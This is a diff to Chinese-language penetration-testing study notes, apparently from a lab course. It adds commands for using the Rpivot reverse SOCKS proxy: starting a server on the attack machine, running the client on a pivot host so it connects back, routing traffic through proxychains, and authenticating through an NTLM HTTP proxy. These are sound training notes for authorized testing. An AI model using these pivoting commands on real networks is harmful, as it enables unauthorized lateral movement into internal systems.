@@ -196,9 +196,25 @@ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v      SSH 到跳板机 ubu
 sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn                  扫描 172.16.5.0/23
 
 
+Rpivot
+反向 SOCKS 代理 (reverse SOCKS proxy) 工具
+攻击机是服务端
+跳板或目标是客户端
+从客户端连接服务端
+  https://github.com/klsecservices/rpivot
+git clone https://github.com/klsecservices/rpivot.git
+python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0                       在攻击机启动服务端
+cp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/                                            传送 ripivot 到跳板
+ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999              在跳板启动客服端
+sudo sed -i '/^socks4 127\.0\.0\.1 9050$/d; $a socks4 127.0.0.1 9050' /etc/proxychains.conf      删除重复，添加新行
+proxychains firefox-esr 172.16.5.135:80                                                          用 firefox 浏览目标
 
-
-
+在某些情况下
+可能无法直接跳板到攻击机
+一些组织配置了与域控制器 (Domain Controller) 一起使用的带 NTLM 认证的 HTTP 代理 (HTTP-proxy with NTLM authentication)
+这种情况下，可以为 rpivot 提供一个额外的 NTLM 认证，提供用户名和密码来经由 NTLM 代理进行身份验证
+可以使用 rpivot 的 client.py:
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 
 
 
